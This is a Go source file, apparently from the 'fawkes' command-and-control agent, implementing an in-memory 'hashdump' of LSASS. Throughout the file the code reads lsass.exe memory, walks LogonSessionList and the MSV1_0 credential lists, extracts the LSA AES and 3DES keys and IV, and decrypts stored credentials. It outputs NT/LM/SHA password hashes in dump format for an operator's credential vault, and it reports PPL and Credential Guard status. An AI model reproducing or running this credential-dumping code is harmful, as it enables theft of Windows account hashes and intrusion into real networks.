//go:build windows
// +build windows

package commands

// Phase 2B + 2C-i + 2C-ii-a + 2C-ii-b + 2C-ii-c orchestrator for hashdump
// in-situ:
//
//   1. Run Phase 1 LSA enumeration to get an authoritative LUID → username
//      map (cross-reference oracle).
//   2. Open lsass.exe with PROCESS_VM_READ + PROCESS_QUERY_LIMITED_INFORMATION
//      and locate lsasrv.dll in the loader list.
//   3. Read the lsasrv.dll image into the agent process and pattern-scan for
//      the LogonSessionList anchor (sigscan + RIP-relative resolution from
//      Phase 2A).
//   4. Walk the doubly-linked LogonSessionList in remote memory.
//   5. For each walked node, overlay the KIWI_MSV1_0_LIST_63 layout (Phase
//      2C-i) to extract LUID, UserName, Domain, AuthPackage, LogonType,
//      LogonServer, and the Credentials list pointer. The structured LUID
//      is cross-referenced against the Phase 1 LUID set as the primary
//      validation; a byte-scan fallback (Phase 2B oracle) flags nodes whose
//      structured LUID is zero so layout drift is visible rather than silent.
//   6. For every node with a non-zero credentials_ptr, walk the
//      KIWI_MSV1_0_CREDENTIAL_LIST chain (Phase 2C-ii-a), dereference each
//      KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope, and capture the
//      encrypted blob bytes alongside the parsed UserName/Domain/AuthPackage.
//   7. Pattern-scan the same lsasrv.dll image for the
//      LsaInitializeProtectedMemory_Internal signature (Phase 2C-ii-b Step 1)
//      and resolve three RIP-relative MOV instructions to recover the
//      LSASS-virtual addresses of the IV / h3DesKey / hAesKey globals. Walk
//      the BCrypt handle → KIWI_BCRYPT_KEY81 → KIWI_HARD_KEY chain to extract
//      the raw 24-byte 3DES + 32-byte AES key bytes plus the 16-byte IV.
//   8. Phase 2C-ii-c: per captured ciphertext blob, AES-256-CFB or 3DES-CBC
//      decrypt using the captured keys + IV, overlay the
//      KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout, and surface the NT / LM /
//      SHA hashes plus the four BOOLEAN validity flags. Emit a
//      `username:rid:lm:nt:::` text block compatible with the existing
//      `dump`-action ProcessResponse parser so the credential-vault
//      registration hook handles MSV1_0-walk hashes the same way as SAM-dump
//      hashes.
//   9. Emit a structured JSON report: one entry per walked node (with a
//      nested credentials array carrying decrypted hash blocks), a summary
//      header, a top-level `lsa_crypto` block describing the captured key
//      material, and a leading dump-compatible plaintext block containing
//      one line per recovered MSV1_0 credential.

import (
	"encoding/hex"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// lsassRemoteReader implements the cross-platform lsassReader interface
// against a live PROCESS_VM_READ handle. Reads short-circuit through the
// existing kernel32!ReadProcessMemory wrapper (lsassReadBytes), which already
// rejects short reads and surfaces a descriptive error string.
type lsassRemoteReader struct {
	h windows.Handle
}

func (r lsassRemoteReader) Read(addr uintptr, size uint32) ([]byte, error) {
	return lsassReadBytes(r.h, addr, size)
}

// insituFullNodeReport is the JSON-shaped record for a single walked
// LogonSessionList node, with Phase 2C-i structured fields layered on top
// of the Phase 2B walk metadata.
type insituFullNodeReport struct {
	Address          string                       `json:"address"`
	Flink            string                       `json:"flink"`
	Blink            string                       `json:"blink"`
	ParsedLUID       string                       `json:"parsed_luid,omitempty"`
	ParsedUserName   string                       `json:"parsed_username,omitempty"`
	ParsedDomain     string                       `json:"parsed_domain,omitempty"`
	ParsedAuthPkg    string                       `json:"parsed_auth_package,omitempty"`
	ParsedLogonType  string                       `json:"parsed_logon_type,omitempty"`
	ParsedLogonSrv   string                       `json:"parsed_logon_server,omitempty"`
	CredentialsPtr   string                       `json:"credentials_ptr,omitempty"`
	Phase1Match      bool                         `json:"phase1_luid_match"`
	Phase1Source     string                       `json:"phase1_match_source,omitempty"` // "structured" | "byte-scan-fallback"
	MatchedUsers     []string                     `json:"matched_users,omitempty"`
	ParseErrors      []string                     `json:"parse_errors,omitempty"`
	RawPreviewHex    string                       `json:"raw_preview_hex"`
	Credentials      []insituFullCredentialReport `json:"credentials,omitempty"`
	CredentialWalkErr string                      `json:"credential_walk_err,omitempty"`
}

// insituFullCredentialReport is the JSON projection of a single
// KIWI_MSV1_0_CREDENTIAL_LIST entry walked from a session's credentials_ptr
// (Phase 2C-ii-a). The encrypted blob is captured as opaque bytes; Phase
// 2C-ii-c populates the optional `decrypted` block when the captured key
// material successfully decrypts and overlays the
// KIWI_MSV1_0_PRIMARY_CREDENTIAL_10_NEW layout.
type insituFullCredentialReport struct {
	Address             string                       `json:"address"`
	AuthPackageId       uint32                       `json:"auth_package_id"`
	AuthPackage         string                       `json:"auth_package"`
	PrimaryCredsAddr    string                       `json:"primary_credentials_address,omitempty"`
	ParsedUserName      string                       `json:"parsed_username,omitempty"`
	ParsedDomain        string                       `json:"parsed_domain,omitempty"`
	EncryptedAddress    string                       `json:"encrypted_address,omitempty"`
	EncryptedLength     uint16                       `json:"encrypted_length,omitempty"`
	EncryptedHexPreview string                       `json:"encrypted_hex_preview,omitempty"`
	ParseErrors         []string                     `json:"parse_errors,omitempty"`
	PrimaryReadErr      string                       `json:"primary_read_err,omitempty"`
	Decrypted           *insituFullDecryptedReport   `json:"decrypted,omitempty"`
	DecryptErr          string                       `json:"decrypt_err,omitempty"`
}

// insituFullDecryptedReport is the JSON projection of a successfully
// decrypted-and-parsed credential blob (Phase 2C-ii-c). NtHashHex is the
// authoritative dump-vault input; LmHashHex / ShaHashHex are surfaced for
// completeness and operator triage.
type insituFullDecryptedReport struct {
	Algorithm        string `json:"algorithm"`
	PlaintextLength  int    `json:"plaintext_length"`
	Layout           string `json:"layout"`
	IsIso            bool   `json:"is_iso"`
	IsNtOwfPassword  bool   `json:"is_nt_owf_password"`
	IsLmOwfPassword  bool   `json:"is_lm_owf_password"`
	IsShaOwPassword  bool   `json:"is_sha_owf_password"`
	NtHashHex        string `json:"nt_hash_hex,omitempty"`
	LmHashHex        string `json:"lm_hash_hex,omitempty"`
	ShaHashHex       string `json:"sha_hash_hex,omitempty"`
	DumpLine         string `json:"dump_line,omitempty"`
	HeaderUserNameLength    uint16 `json:"header_username_length"`
	HeaderUserNameMaxLen    uint16 `json:"header_username_max_length"`
	HeaderLogonDomainLength uint16 `json:"header_logon_domain_length"`
	HeaderLogonDomainMaxLen uint16 `json:"header_logon_domain_max_length"`
	ParseErr                string `json:"parse_err,omitempty"`
}

// insituFullSummary captures the top-level metadata of a hashdump in-situ
// full run (Phase 2B walk + Phase 2C-i structured parse + Phase 2C-ii-a
// credential-list walk + Phase 2C-ii-b key extraction + Phase 2C-ii-c
// decryption + plaintext NT/LM/SHA extraction).
type insituFullSummary struct {
	Phase1SessionCount       int                    `json:"phase1_session_count"`
	LsassProtection          *insituFullProtectionReport `json:"lsass_protection,omitempty"`
	LSASSPID                 uint32                 `json:"lsass_pid"`
	LsasrvBase               string                 `json:"lsasrv_base"`
	LsasrvSize               uint32                 `json:"lsasrv_size"`
	AnchorAddr               string                 `json:"logon_session_list_anchor"`
	StructLayout             string                 `json:"struct_layout"`
	CryptoLayout             string                 `json:"crypto_layout,omitempty"`
	PrimaryCredentialLayout  string                 `json:"primary_credential_layout,omitempty"`
	LsaCrypto                *insituFullCryptoReport `json:"lsa_crypto,omitempty"`
	LsaCryptoErr             string                 `json:"lsa_crypto_err,omitempty"`
	NodesWalked              int                    `json:"nodes_walked"`
	NodesMatched             int                    `json:"nodes_matched_to_phase1"`
	NodesStructParsed        int                    `json:"nodes_with_structured_luid"`
	NodesWithCredentials     int                    `json:"nodes_with_credential_list"`
	CredentialBlobsCaptured  int                    `json:"credential_blobs_captured"`
	CredentialBlobsDecrypted int                    `json:"credential_blobs_decrypted"`
	HashesExtracted          int                    `json:"hashes_extracted"`
	UnmatchedLUIDs           []string               `json:"phase1_luids_not_seen_in_walk,omitempty"`
	Nodes                    []insituFullNodeReport `json:"nodes"`
}

// insituFullProtectionReport is the JSON projection of the LSA protection
// state read from the registry by detectLsassProtection(). Surfaced at the
// top of every insitu-full run so layout drift is distinguishable from
// "OpenProcess(LSASS) failed because the kernel rejected PROCESS_VM_READ
// from a non-PPL caller".
type insituFullProtectionReport struct {
	RunAsPPL                 string `json:"run_as_ppl"`
	RunAsPPLDetected         bool   `json:"run_as_ppl_detected"`
	RunAsPPLValue            uint32 `json:"run_as_ppl_value"`
	LsaCfgFlags              string `json:"lsa_cfg_flags"`
	LsaCfgFlagsDetected      bool   `json:"lsa_cfg_flags_detected"`
	LsaCfgFlagsValue         uint32 `json:"lsa_cfg_flags_value"`
	PPLActive                bool   `json:"ppl_active"`
	CredentialGuardActive    bool   `json:"credential_guard_active"`
	Summary                  string `json:"summary"`
	RegistryError            string `json:"registry_error,omitempty"`
}

func newProtectionReport(s LsassProtectionState) *insituFullProtectionReport {
	return &insituFullProtectionReport{
		RunAsPPL:              s.RunAsPPLLabel(),
		RunAsPPLDetected:      s.RunAsPPLDetected,
		RunAsPPLValue:         s.RunAsPPL,
		LsaCfgFlags:           s.LsaCfgFlagsLabel(),
		LsaCfgFlagsDetected:   s.LsaCfgFlagsDetected,
		LsaCfgFlagsValue:      s.LsaCfgFlags,
		PPLActive:             s.PPLActive(),
		CredentialGuardActive: s.CredentialGuardActive(),
		Summary:               s.Summary(),
		RegistryError:         s.Error,
	}
}

// insituFullCryptoReport is the JSON projection of the Phase 2C-ii-b key
// extraction: IV bytes plus the two BCrypt key blobs (3DES + AES) lsasrv
// uses to encrypt MSV1_0 credentials. Phase 2C-ii-c will use these to
// AES-CFB / 3DES-CBC decrypt every ciphertext blob captured in
// `credentials[].encrypted_hex_preview` of the per-node reports.
type insituFullCryptoReport struct {
	IVAddress   string `json:"iv_address"`
	IVHex       string `json:"iv_hex,omitempty"`
	IVErr       string `json:"iv_err,omitempty"`
	H3DesGlobal string `json:"h3deskey_global"`
	H3DesKey    *insituFullBcryptKeyReport `json:"h3deskey,omitempty"`
	H3DesErr    string `json:"h3deskey_err,omitempty"`
	HAesGlobal  string `json:"haeskey_global"`
	HAesKey     *insituFullBcryptKeyReport `json:"haeskey,omitempty"`
	HAesErr     string `json:"haeskey_err,omitempty"`
}

// insituFullBcryptKeyReport is the JSON projection of one resolved BCrypt
// key (h3DesKey or hAesKey). Captures both the KIWI_BCRYPT_HANDLE_KEY tag and
// the KIWI_BCRYPT_KEY81 tag so layout-drift cases are visible, plus the raw
// key bytes themselves. The key bytes are the input Phase 2C-ii-c will feed
// into crypto/aes / crypto/des to recover plaintext credentials.
type insituFullBcryptKeyReport struct {
	HandleAddress  string `json:"handle_address"`
	HandleSize     uint32 `json:"handle_size"`
	HandleTag      string `json:"handle_tag"`
	HandleTagValid bool   `json:"handle_tag_valid"`
	HAlgorithm     string `json:"h_algorithm,omitempty"`
	KeyAddress     string `json:"key_address"`
	KeySize        uint32 `json:"key_size"`
	KeyTag         string `json:"key_tag"`
	KeyTagValid    bool   `json:"key_tag_valid"`
	KeyType        uint32 `json:"key_type"`
	KeyBits        uint32 `json:"key_bits"`
	CbSecret       uint32 `json:"cb_secret"`
	KeyHex         string `json:"key_hex,omitempty"`
}

// executeInsituFull runs the full Phase 2B credential-discovery flow and
// returns a structured CommandResult. The output starts with a human-readable
// header, then a JSON payload with the full node walk for downstream tools.
func executeInsituFull() structs.CommandResult {
	// Step 1: Phase 1 enumeration. If this fails the run is aborted because
	// without the LUID oracle there is nothing to validate the walk against.
	phase1, err := enumerateInsituSessions()
	if err != nil {
		return errorf("Phase 1 LSA enumeration failed: %v", err)
	}

	luidIndex := make(map[uint64][]insituSession, len(phase1))
	luidsOrdered := make([]uint64, 0, len(phase1))
	for _, s := range phase1 {
		luid, ok := insituLUIDValue(s)
		if !ok {
			continue
		}
		luidIndex[luid] = append(luidIndex[luid], s)
		luidsOrdered = append(luidsOrdered, luid)
	}

	// Step 2: Detect LSASS protection state (PPL / Credential Guard) from
	// the registry. Best-effort, never aborts — the goal is to give the
	// operator a concrete reason when OpenProcess fails on the next line.
	protection := detectLsassProtection()

	// Step 2b: Open LSASS.
	pid, err := lsassFindPID()
	if err != nil {
		return errorf("Phase 2B: locate lsass.exe: %v", err)
	}
	h, err := lsassOpenForRead(pid)
	if err != nil {
		return errorf("Phase 2B: open lsass.exe pid=%d: %v\n[!] Detected protection state: %s\n[!] %s",
			pid, err, protection.Summary(), protection.AccessDeniedHint())
	}
	defer windows.CloseHandle(h)

	// Step 3: Find lsasrv.dll.
	mod, err := lsassFindModuleInLsass(pid, "lsasrv.dll")
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}

	// Step 4: Read its bytes and locate the LogonSessionList anchor.
	lsasrvBytes, err := lsassReadModuleBytes(h, mod)
	if err != nil {
		return errorf("Phase 2B: read lsasrv.dll image (base=0x%X size=%d): %v", mod.Base, mod.Size, err)
	}
	anchor, err := findLogonSessionListAnchor(lsasrvBytes, mod.Base)
	if err != nil {
		return errorf("Phase 2B: %v", err)
	}

	// Step 5a: Phase 2C-ii-b key extraction — runs BEFORE the LogonSessionList
	// walk so Phase 2C-ii-c can decrypt each ciphertext blob inline as the
	// credential walk discovers it. Failures are non-fatal — the LogonSessionList
	// walk and credential-list walk are independently useful even when key
	// extraction fails on a build the signature isn't calibrated for.
	reader := lsassRemoteReader{h: h}
	cryptoLayout := LsaCryptoWin10W8
	cryptoReport, cryptoMaterial, cryptoErrStr := captureLsaCrypto(reader, lsasrvBytes, mod.Base, cryptoLayout)
	canDecrypt := cryptoMaterial.HasAESKey() || cryptoMaterial.HasDESKey()

	// Step 5b: Walk LogonSessionList. Partial walks are still useful — emit
	// what was collected even if a tail node fails. Read 0x180 bytes/node so
	// the Phase 2C-i layout (LUID, UserName, Domain, Type, LogonType,
	// LogonServer, Credentials) is captured in one ReadProcessMemory call.
	layout := LayoutWin10W8
	nodes, walkErr := walkLogonSessionList(reader, anchor, layout.NodeReadSize, 64)

	// Step 6: For each walked node, overlay the layout to extract structured
	// fields, then cross-reference the parsed LUID against Phase 1. Fall back
	// to the Phase 2B byte-scan when the structured parse returns LUID 0
	// (likely layout drift on a different Windows build).
	matchedLUIDs := make(map[uint64]bool, len(luidIndex))
	reports := make([]insituFullNodeReport, 0, len(nodes))
	matchedNodes := 0
	structParsed := 0
	nodesWithCreds := 0
	credBlobsCaptured := 0
	credBlobsDecrypted := 0
	hashesExtracted := 0
	dumpLines := make([]string, 0, 8)
	for _, n := range nodes {
		preview := 32
		if len(n.Raw) < preview {
			preview = len(n.Raw)
		}
		report := insituFullNodeReport{
			Address:       fmt.Sprintf("0x%X", n.Address),
			Flink:         fmt.Sprintf("0x%X", n.Flink),
			Blink:         fmt.Sprintf("0x%X", n.Blink),
			RawPreviewHex: hex.EncodeToString(n.Raw[:preview]),
		}
		parsed := parseLogonSessionFields(reader, n.Raw, layout)
		if parsed.LUID != 0 {
			structParsed++
			report.ParsedLUID = fmt.Sprintf("0x%016X", parsed.LUID)
		}
		report.ParsedUserName = parsed.UserName
		report.ParsedDomain = parsed.Domain
		report.ParsedAuthPkg = parsed.AuthPackage
		report.ParsedLogonSrv = parsed.LogonServer
		if name := logonSessionTypeName(parsed.LogonType); name != "" {
			report.ParsedLogonType = name
		}
		if parsed.CredentialsPtr != 0 {
			report.CredentialsPtr = fmt.Sprintf("0x%X", parsed.CredentialsPtr)
		}
		report.ParseErrors = parsed.ParseErrors

		// Primary cross-reference: parsed LUID matches a Phase 1 LUID.
		if parsed.LUID != 0 {
			if _, ok := luidIndex[parsed.LUID]; ok {
				matchedLUIDs[parsed.LUID] = true
				report.Phase1Match = true
				report.Phase1Source = "structured"
				for _, sess := range luidIndex[parsed.LUID] {
					report.MatchedUsers = append(report.MatchedUsers,
						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
				}
			}
		}
		// Fallback: Phase 2B byte-scan when structured parse missed.
		if !report.Phase1Match {
			for _, luid := range luidsOrdered {
				if !scanRawForLUID(n.Raw, luid) {
					continue
				}
				matchedLUIDs[luid] = true
				report.Phase1Match = true
				report.Phase1Source = "byte-scan-fallback"
				for _, sess := range luidIndex[luid] {
					report.MatchedUsers = append(report.MatchedUsers,
						fmt.Sprintf("%s\\%s (%s)", sess.Domain, sess.Username, sess.LogonType))
				}
				break
			}
		}
		if report.Phase1Match {
			matchedNodes++
		}

		// Phase 2C-ii-a: walk the credential list at credentials_ptr. The walk
		// is independent of Phase 1 cross-referencing — we report on every
		// node that exposes a non-zero pointer, including nodes whose
		// structured LUID didn't match Phase 1 (so layout-drift cases still
		// surface ciphertext for inspection).
		if parsed.CredentialsPtr != 0 {
			creds, walkErr := walkCredentialList(reader, parsed.CredentialsPtr, credentialListMaxEntries)
			if walkErr != nil {
				report.CredentialWalkErr = walkErr.Error()
			}
			if len(creds) > 0 {
				nodesWithCreds++
				report.Credentials = make([]insituFullCredentialReport, 0, len(creds))
				for _, c := range creds {
					credReport := insituFullCredentialReport{
						Address:       fmt.Sprintf("0x%X", c.Address),
						AuthPackageId: c.AuthPackageId,
						AuthPackage:   c.AuthPackageName,
					}
					if c.PrimaryCredentialsDataPtr != 0 {
						credReport.PrimaryCredsAddr = fmt.Sprintf("0x%X", c.PrimaryCredentialsDataPtr)
					}
					if c.PrimaryReadErr != "" {
						credReport.PrimaryReadErr = c.PrimaryReadErr
					}
					if c.Primary != nil {
						credReport.ParsedUserName = c.Primary.UserName
						credReport.ParsedDomain = c.Primary.Domain
						if c.Primary.EncryptedAddress != 0 {
							credReport.EncryptedAddress = fmt.Sprintf("0x%X", c.Primary.EncryptedAddress)
						}
						credReport.EncryptedLength = c.Primary.EncryptedLength
						if len(c.Primary.EncryptedBytes) > 0 {
							previewLen := len(c.Primary.EncryptedBytes)
							if previewLen > 64 {
								previewLen = 64
							}
							credReport.EncryptedHexPreview = hex.EncodeToString(c.Primary.EncryptedBytes[:previewLen])
							credBlobsCaptured++

							// Phase 2C-ii-c: decrypt + parse inline. Only MSV1_0
							// credentials parse cleanly with the
							// PRIMARY_CREDENTIAL_10_NEW layout — Kerberos / WDigest /
							// CloudAP envelopes also use LsaProtectMemory but layer
							// a different plaintext schema, so their decrypted
							// blocks will populate but their NT/LM/SHA fields will
							// often be all-zero (and therefore filtered out of the
							// dump-line output). The JSON `decrypted` block is
							// still attached so an operator can inspect raw
							// plaintext bytes for layout-drift triage.
							if canDecrypt {
								dec, line := decryptCredentialBlob(cryptoMaterial, c.Primary.EncryptedBytes, c.Primary.UserName)
								credReport.Decrypted = dec
								if dec != nil && dec.ParseErr != "" {
									credReport.DecryptErr = dec.ParseErr
								}
								if dec != nil && dec.NtHashHex != "" {
									credBlobsDecrypted++
									hashesExtracted++
								}
								if line != "" {
									dumpLines = append(dumpLines, line)
								}
							}
						}
						credReport.ParseErrors = c.Primary.ParseErrors
					}
					report.Credentials = append(report.Credentials, credReport)
				}
			}
		}

		reports = append(reports, report)
	}

	var unmatched []string
	for _, luid := range luidsOrdered {
		if !matchedLUIDs[luid] {
			unmatched = append(unmatched, fmt.Sprintf("0x%016X", luid))
		}
	}

	// Step 7 (Phase 2C-ii-b key extraction) ran BEFORE the walk so step 6's
	// credential loop could decrypt inline; the cryptoReport + cryptoMaterial
	// are wired into the summary directly.

	summary := insituFullSummary{
		Phase1SessionCount:       len(phase1),
		LsassProtection:          newProtectionReport(protection),
		LSASSPID:                 pid,
		LsasrvBase:               fmt.Sprintf("0x%X", mod.Base),
		LsasrvSize:               mod.Size,
		AnchorAddr:               fmt.Sprintf("0x%X", anchor),
		StructLayout:             layout.Name,
		CryptoLayout:             cryptoLayout.Name,
		PrimaryCredentialLayout:  PrimaryCredential10NewLayout.Name,
		LsaCrypto:                cryptoReport,
		LsaCryptoErr:             cryptoErrStr,
		NodesWalked:              len(nodes),
		NodesMatched:             matchedNodes,
		NodesStructParsed:        structParsed,
		NodesWithCredentials:     nodesWithCreds,
		CredentialBlobsCaptured:  credBlobsCaptured,
		CredentialBlobsDecrypted: credBlobsDecrypted,
		HashesExtracted:          hashesExtracted,
		UnmatchedLUIDs:           unmatched,
		Nodes:                    reports,
	}

	jsonBytes, err := json.MarshalIndent(summary, "", "  ")
	if err != nil {
		return errorf("Phase 2B: marshal summary: %v", err)
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[+] Phase 1 LSA enumeration: %d session(s)\n", len(phase1)))
	sb.WriteString(fmt.Sprintf("[+] LSASS protection: %s\n", protection.Summary()))
	sb.WriteString(fmt.Sprintf("[+] LSASS pid=%d, lsasrv.dll @ 0x%X (size %d bytes)\n", pid, mod.Base, mod.Size))
	sb.WriteString(fmt.Sprintf("[+] LogonSessionList anchor: 0x%X\n", anchor))
	if walkErr != nil {
		sb.WriteString(fmt.Sprintf("[!] Walk terminated early: %v (collected %d node(s))\n", walkErr, len(nodes)))
	} else {
		sb.WriteString(fmt.Sprintf("[+] Walked %d node(s) cleanly\n", len(nodes)))
	}
	sb.WriteString(fmt.Sprintf("[+] Layout: %s — %d/%d node(s) yielded a non-zero structured LUID\n", layout.Name, structParsed, len(nodes)))
	sb.WriteString(fmt.Sprintf("[+] Cross-referenced %d/%d Phase 1 LUID(s) into walked nodes\n", len(matchedLUIDs), len(luidsOrdered)))
	sb.WriteString(fmt.Sprintf("[+] Credential lists: %d node(s) yielded credential entries; %d encrypted blob(s) captured (Phase 2C-ii-a)\n", nodesWithCreds, credBlobsCaptured))
	if cryptoErrStr != "" {
		sb.WriteString(fmt.Sprintf("[!] LSA crypto extraction failed: %s\n", cryptoErrStr))
	} else if cryptoReport != nil {
		sb.WriteString(fmt.Sprintf("[+] LSA crypto: IV @ %s; h3DesKey @ %s (cb=%d); hAesKey @ %s (cb=%d) — Phase 2C-ii-b\n",
			cryptoReport.IVAddress,
			cryptoReport.H3DesGlobal, bcryptCbSecret(cryptoReport.H3DesKey),
			cryptoReport.HAesGlobal, bcryptCbSecret(cryptoReport.HAesKey)))
	}
	sb.WriteString(fmt.Sprintf("[+] Decryption: %d blob(s) yielded an MSV1_0 NT hash (%s layout) — Phase 2C-ii-c\n",
		hashesExtracted, PrimaryCredential10NewLayout.Name))

	// Dump-compatible text block: emit one `username:rid:lm:nt:::` line per
	// recovered MSV1_0 credential. The existing hashdump ProcessResponse hook
	// in agentfunctions/hashdump.go parses this exact format and registers
	// each entry in the credential vault — Phase 2C-ii-c reuses the dump
	// pipeline rather than introducing a parallel one.
	if len(dumpLines) > 0 {
		sb.WriteString("\n")
		for _, line := range dumpLines {
			sb.WriteString(line)
			sb.WriteString("\n")
		}
	}

	sb.WriteString("\n")
	sb.WriteString(string(jsonBytes))
	return successResult(sb.String())
}

// bcryptCbSecret returns the resolved cbSecret of a BCrypt key report or 0
// when the report wasn't captured.
func bcryptCbSecret(r *insituFullBcryptKeyReport) uint32 {
	if r == nil {
		return 0
	}
	return r.CbSecret
}

// lsaCryptoMaterial bundles the raw bytes captured by Phase 2C-ii-b alongside
// their JSON projection. The orchestrator passes the raw bytes into Phase
// 2C-ii-c's decryptLsaProtectedMemory; the JSON projection is what goes into
// the structured output.
type lsaCryptoMaterial struct {
	IV     []byte
	AESKey []byte
	DESKey []byte
}

// HasAESKey reports whether the AES key material is fully captured (32-byte
// secret + 16-byte IV). Only when this is true can Phase 2C-ii-c decrypt the
// modern AES-CFB ciphertext path.
func (m lsaCryptoMaterial) HasAESKey() bool {
	return len(m.AESKey) == lsaAESKeyLen && len(m.IV) >= lsaAESIVLen
}

// HasDESKey reports whether the 3DES key material is fully captured (24-byte
// secret + 8-byte IV minimum). Only when this is true can Phase 2C-ii-c
// decrypt the legacy 3DES-CBC ciphertext path.
func (m lsaCryptoMaterial) HasDESKey() bool {
	return len(m.DESKey) == lsaTDESKeyLen && len(m.IV) >= lsaTDESIVLen
}

// captureLsaCrypto runs the Phase 2C-ii-b key extraction:
//
//  1. Sigscan lsasrvBytes for LsaInitializeProtectedMemory_Internal.
//  2. Resolve the three RIP-relative MOVs to recover IV / h3DesKey / hAesKey
//     LSASS-virtual addresses.
//  3. ReadProcessMemory the IV bytes and walk the BCrypt key chain for both
//     keys, capturing the raw key material.
//
// Returns the structured JSON projection AND a `lsaCryptoMaterial` carrying
// the raw bytes Phase 2C-ii-c needs. Any sigscan / read failure surfaces in
// the returned error string rather than aborting the parent run —
// credential-blob inspection still works without keys, and operators
// triaging layout drift want to see the partial data.
func captureLsaCrypto(r lsassReader, lsasrvBytes []byte, lsasrvBase uintptr, layout lsaCryptoLayout) (*insituFullCryptoReport, lsaCryptoMaterial, string) {
	var material lsaCryptoMaterial
	globals, err := findLsaCryptoGlobals(lsasrvBytes, lsasrvBase, layout)
	if err != nil {
		return nil, material, err.Error()
	}
	report := &insituFullCryptoReport{
		IVAddress:   fmt.Sprintf("0x%X", globals.IVAddr),
		H3DesGlobal: fmt.Sprintf("0x%X", globals.H3DesKeyAddr),
		HAesGlobal:  fmt.Sprintf("0x%X", globals.HAesKeyAddr),
	}

	if iv, err := readIVBytes(r, globals.IVAddr, layout.IVSize); err != nil {
		report.IVErr = err.Error()
	} else {
		report.IVHex = hex.EncodeToString(iv)
		material.IV = iv
	}

	if hk, k, err := readBcryptKeyMaterial(r, globals.H3DesKeyAddr); err != nil {
		report.H3DesErr = err.Error()
	} else {
		report.H3DesKey = bcryptKeyReport(hk, k)
		material.DESKey = append([]byte(nil), k.Key...)
	}
	if hk, k, err := readBcryptKeyMaterial(r, globals.HAesKeyAddr); err != nil {
		report.HAesErr = err.Error()
	} else {
		report.HAesKey = bcryptKeyReport(hk, k)
		material.AESKey = append([]byte(nil), k.Key...)
	}
	return report, material, ""
}

// decryptCredentialBlob runs Phase 2C-ii-c against a single captured
// ciphertext blob. Returns a JSON-shaped report and (when the blob decrypts +
// parses + carries an actionable NT hash) a `username:rid:lm:nt:::` text line
// suitable for the existing dump-action ProcessResponse parser. The username
// argument is the outer KIWI_MSV1_0_PRIMARY_CREDENTIAL_ENC envelope's
// UserName captured by Phase 2C-ii-a; the inner LSA_UNICODE_STRING.Buffer
// pointers in the decrypted plaintext point at LSASS-virtual memory and are
// not re-dereferenced here (avoids a second remote read).
func decryptCredentialBlob(material lsaCryptoMaterial, ciphertext []byte, outerUserName string) (*insituFullDecryptedReport, string) {
	plaintext, alg, err := decryptLsaProtectedMemory(ciphertext, material.AESKey, material.DESKey, material.IV)
	if err != nil {
		report := &insituFullDecryptedReport{Algorithm: string(alg)}
		report.ParseErr = err.Error()
		return report, ""
	}
	parsed, perr := parsePrimaryCredential10New(plaintext)
	report := &insituFullDecryptedReport{
		Algorithm:               string(alg),
		PlaintextLength:         len(plaintext),
		Layout:                  parsed.Layout,
		IsIso:                   parsed.IsIso,
		IsNtOwfPassword:         parsed.IsNtOwfPassword,
		IsLmOwfPassword:         parsed.IsLmOwfPassword,
		IsShaOwPassword:         parsed.IsShaOwPassword,
		HeaderUserNameLength:    parsed.UserNameHeaderLength,
		HeaderUserNameMaxLen:    parsed.UserNameHeaderMaxLen,
		HeaderLogonDomainLength: parsed.LogonDomainHeaderLength,
		HeaderLogonDomainMaxLen: parsed.LogonDomainHeaderMaxLen,
	}
	if perr != nil {
		report.ParseErr = perr.Error()
		return report, ""
	}
	if !allZeroBytes(parsed.NtOwfPassword[:]) {
		report.NtHashHex = hex.EncodeToString(parsed.NtOwfPassword[:])
	}
	if !allZeroBytes(parsed.LmOwfPassword[:]) {
		report.LmHashHex = hex.EncodeToString(parsed.LmOwfPassword[:])
	}
	if !allZeroBytes(parsed.ShaOwPassword[:]) {
		report.ShaHashHex = hex.EncodeToString(parsed.ShaOwPassword[:])
	}
	dumpLine := hashdumpDumpLine(outerUserName, parsed.NtOwfPassword, parsed.LmOwfPassword, parsed.IsLmOwfPassword)
	report.DumpLine = dumpLine
	return report, dumpLine
}

// bcryptKeyReport projects a (handle, key81) pair into JSON-shaped output.
// Tag bytes are rendered as their stored little-endian byte sequence so an
// operator reading the report sees the literal "RUUU" / "KSSM" rather than
// the magic-number DWORD.
func bcryptKeyReport(hk bcryptHandleKey, k bcryptKey81) *insituFullBcryptKeyReport {
	out := &insituFullBcryptKeyReport{
		HandleAddress:  fmt.Sprintf("0x%X", hk.Address),
		HandleSize:     hk.Size,
		HandleTag:      tagToASCII(hk.Tag),
		HandleTagValid: hk.TagValid,
		KeyAddress:     fmt.Sprintf("0x%X", k.Address),
		KeySize:        k.Size,
		KeyTag:         tagToASCII(k.Tag),
		KeyTagValid:    k.TagValid,
		KeyType:        k.Type,
		KeyBits:        k.Bits,
		CbSecret:       k.CbSecret,
	}
	if hk.HAlgorithm != 0 {
		out.HAlgorithm = fmt.Sprintf("0x%X", hk.HAlgorithm)
	}
	if len(k.Key) > 0 {
		out.KeyHex = hex.EncodeToString(k.Key)
	}
	return out
}

// tagToASCII renders a 4-byte DWORD tag as the four ASCII bytes that would
// appear in memory (little-endian: low byte first). Non-printable bytes are
// rendered as `.` so the result is always 4 chars, suitable for JSON output.
func tagToASCII(tag uint32) string {
	bytes := []byte{
		byte(tag),
		byte(tag >> 8),
		byte(tag >> 16),
		byte(tag >> 24),
	}
	for i, b := range bytes {
		if b < 0x20 || b > 0x7E {
			bytes[i] = '.'
		}
	}
	return string(bytes)
}
